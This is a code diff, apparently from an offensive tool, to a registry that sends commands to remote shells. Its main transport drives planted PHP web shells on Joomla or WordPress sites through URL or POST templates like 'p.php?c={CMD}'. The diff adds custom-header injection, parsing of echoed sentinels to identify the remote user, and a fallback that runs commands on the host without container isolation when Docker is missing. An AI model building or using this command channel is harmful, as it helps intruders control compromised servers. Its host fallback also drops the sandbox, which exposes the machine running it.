@@ -203,7 +203,7 @@ export function createShellRegistry({ bus, listScope } = {}) {  // CS20-11: wal 
     // transportRef 格式校验(register 时拦截,不留到 exec 才爆)
     const tr = String(transportRef || '');
     if (transport === 'web' && !tr.includes('{CMD}'))
-      return { error: 'web transportRef 需含 {CMD} 占位(如 http://h/p.php?c={CMD}#MARK)' };
+      return { error: 'web transportRef 需含 {CMD} 占位(如 http://h/p.php?c={CMD}#MARK);自定义头加 "H: 名称: 值" 段(POST 用 | 分隔,GET 用空格)' };
     if (transport === 'ssh' && !SSH_REF_RE.test(tr))
       return { error: 'ssh transportRef 需 user:pass@host[:port]' };
     if (transport === 'local' && !tr)
@@ -291,7 +291,9 @@ export function createShellRegistry({ bus, listScope } = {}) {  // CS20-11: wal 
         // — only text between <MARK> and </MARK> is returned (kills the
         // Joomla/WordPress page-prefix noise that caused two misreads).
         const spec = sh.transportRef || '';
-        const [spec0, marker] = spec.split('#');
+        const [spec0raw, marker] = spec.split('#');
+        // r6-#3: {CMD} 与 #MARK 之间的尾随空白不进请求(击碎精确白名单)
+        const spec0 = spec0raw.replace(/\s+$/, '');
         const isPost = spec0.startsWith('POST|');
         const tpl = isPost ? spec0.slice(5) : spec0;
         // F26: POST 模板形如 "url|c={CMD}" —— url 与 form 段用 | 分隔;
@@ -300,10 +302,40 @@ export function createShellRegistry({ bus, listScope } = {}) {  // CS20-11: wal 
         // 做 body。无 | 时 form 段缺省 c={CMD}。
         const postSplit = isPost ? tpl.split('|') : [];
         const postUrl = isPost ? (postSplit[0] || tpl) : tpl;
-        const postForm = isPost ? (postSplit.slice(1).join('|') || 'c={CMD}') : '';
+        // r6-#1/#2: 附加头语法——段形如 "H: 名称: 值"(POST 第 5 段起/
+        // GET 无 | 时 #MARK 前 " H: …" 空格分隔段)。此前第 4 段被静默
+        // 并入 body; 现显式解析, 非法段报错不再吞。
+        const extraHeaders = {};
+        const headerRe = /^\s*H:\s*([!#$%&'*+.^`|~0-9A-Za-z-]+):\s*(.*)$/;
+        let postForm = '';
+        if (isPost) {
+          const formParts = postSplit.slice(1);
+          const stray = [];
+          for (const part of formParts) {
+            const hm = headerRe.exec(part);
+            if (hm) extraHeaders[hm[1]] = hm[2].trim();
+            else stray.push(part);
+          }
+          if (stray.length > 1) {
+            return { ok: false, error: `transportRef 第 4+ 段无法识别(${stray.slice(1).join('|').slice(0, 60)})——自定义头请用 "H: 名称: 值" 段` };
+          }
+          postForm = stray.join('|') || 'c={CMD}';
+        } else {
+          // GET 形态: "...{CMD} H: K: v H: K2: v2#MARK" 空格分隔头段
+          const segs = tpl.split(/\s+(?=H:\s)/);
+          for (const seg of segs.slice(1)) {
+            const hm = headerRe.exec(seg.trim());
+            if (hm) extraHeaders[hm[1]] = hm[2].trim();
+          }
+          if (segs.length > 1) {
+            // 剥离头段后重设 url 模板
+            sh._urlTpl = segs[0];
+          }
+        }
         if (!tpl.includes('{CMD}')) return { ok: false, error: 'web transportRef 需含 {CMD} 占位' };
         const enc = encodeURIComponent(command);
-        const url = isPost ? postUrl : tpl.replace('{CMD}', enc);
+        const urlTpl = (!isPost && sh._urlTpl) ? sh._urlTpl : (isPost ? postUrl : tpl);
+        const url = isPost ? postUrl : urlTpl.replace('{CMD}', enc);
         const body = isPost ? postForm.replace('{CMD}', enc) : null;
         const ctl = new AbortController();
         // 自测-6: 上限裁剪显式化——此前静默钳 60s, 调用方传大值无效且回执
@@ -315,7 +347,10 @@ export function createShellRegistry({ bus, listScope } = {}) {  // CS20-11: wal 
           const r = await fetch(url, {
             method: isPost ? 'POST' : 'GET',
             body: isPost ? new URLSearchParams(parseFormBody(body)) : undefined,
-            headers: isPost ? { 'content-type': 'application/x-www-form-urlencoded' } : {},
+            headers: {
+              ...(isPost ? { 'content-type': 'application/x-www-form-urlencoded' } : {}),
+              ...extraHeaders,
+            },
             signal: ctl.signal,
           });
           let txt = await r.text();
@@ -345,15 +380,32 @@ export function createShellRegistry({ bus, listScope } = {}) {  // CS20-11: wal 
         // (泄漏 bash+sleep),且 docker CLI 被 SIGTERM 后 err 为空导致超时
         // 谎报 code:0 ok:true。容器内 timeout 真杀进程并返回 124。
         const tSec = Math.max(1, Math.ceil(timeoutMs / 1000));
-        const argv = cuser
-          ? ['exec', '-u', cuser, cbox, 'timeout', '-k', '5', String(tSec), 'bash', '-lc', command]
-          : ['exec', cbox, 'timeout', '-k', '5', String(tSec), 'bash', '-lc', command];
-        const res = await new Promise((resolve) => {
-          execFile('docker', argv, { timeout: timeoutMs + 5_000, maxBuffer: MAX_OUT }, (err, so, se) =>
-            resolve({ err, so: String(so ?? ''), se: String(se ?? '') }));
-        });
-        ({ stdout, stderr, code } = boundedExecResult(
-          res.err, res.so, res.se, '[timeout: 容器内进程已被 timeout(1) 终止]', 'docker(local 传输经沙箱容器执行)'));
+        // r6-#5: docker 缺席时降级宿主 sh(不再 ENOENT 裸崩)——回执注明
+        // 降级形态(容器语义丢失: 无 cuser 隔离/无容器 FS)。
+        const haveDocker = sandboxConfig().driver === 'docker';
+        let res;
+        if (haveDocker) {
+          const argv = cuser
+            ? ['exec', '-u', cuser, cbox, 'timeout', '-k', '5', String(tSec), 'bash', '-lc', command]
+            : ['exec', cbox, 'timeout', '-k', '5', String(tSec), 'bash', '-lc', command];
+          res = await new Promise((resolve) => {
+            execFile('docker', argv, { timeout: timeoutMs + 5_000, maxBuffer: MAX_OUT }, (err, so, se) =>
+              resolve({ err, so: String(so ?? ''), se: String(se ?? '') }));
+          });
+          ({ stdout, stderr, code } = boundedExecResult(
+            res.err, res.so, res.se, '[timeout: 容器内进程已被 timeout(1) 终止]', 'docker(local 传输经沙箱容器执行)'));
+        } else {
+          res = await new Promise((resolve) => {
+            execFile('bash', ['-lc', `timeout -k 5 ${tSec} bash -lc ${JSON.stringify(command)}`],
+              { timeout: timeoutMs + 5_000, maxBuffer: MAX_OUT }, (err, so, se) =>
+              resolve({ err, so: String(so ?? ''), se: String(se ?? '') }));
+          });
+          ({ stdout, stderr, code } = boundedExecResult(
+            res.err, res.so, res.se, '[timeout: 宿主侧进程已被 timeout(1) 终止]', 'sh 降级(docker 缺席, 宿主直跑——无容器隔离)'));
+          if (stdout && !stdout.includes('sh 降级')) {
+            stdout += '\n[driver=sh 降级: docker 缺席, 本命令实际跑在宿主而非 ' + cbox + ' 容器]';
+          }
+        }
       } else {
         return { ok: false, error: `transport ${sh.transport} 未接入(真实植入通道后续挂)` };
       }
@@ -390,7 +442,14 @@ export function createShellRegistry({ bus, listScope } = {}) {  // CS20-11: wal 
       } else {
         // EW-2: 哨兵残缺的响应(截断/污染)——剥哨兵后取首行, 非打印/
         // HTML 形态直接判污染置空(r4 实测 user 残留哨兵)。
-        const stripped = raw.replace(/__SPF\d__/g, '').split('\n')[0].trim();
+        // r6-#4: 递归回显(响应把命令文本原样/URL 编码回显)——先剥编码
+        // 形态哨兵, 再尝试 decode 一次, 白名单不过即判污染置空。
+        let stripped = raw.replace(/__SPF\d__/g, '')
+          .replace(/%5F%5FSPF|%5f%5fSPF/gi, '__SPF').replace(/__SPF\d+__/gi, '')
+          .split('\n')[0].trim();
+        if (/%[0-9a-f]{2}/i.test(stripped)) {
+          try { stripped = decodeURIComponent(stripped).replace(/__SPF\d+/g, '').trim(); } catch { /* 保原值走白名单 */ }
+        }
         user = /^[A-Za-z0-9._-]{1,32}$/.test(stripped) ? stripped : '';
         osLine = '';
       }
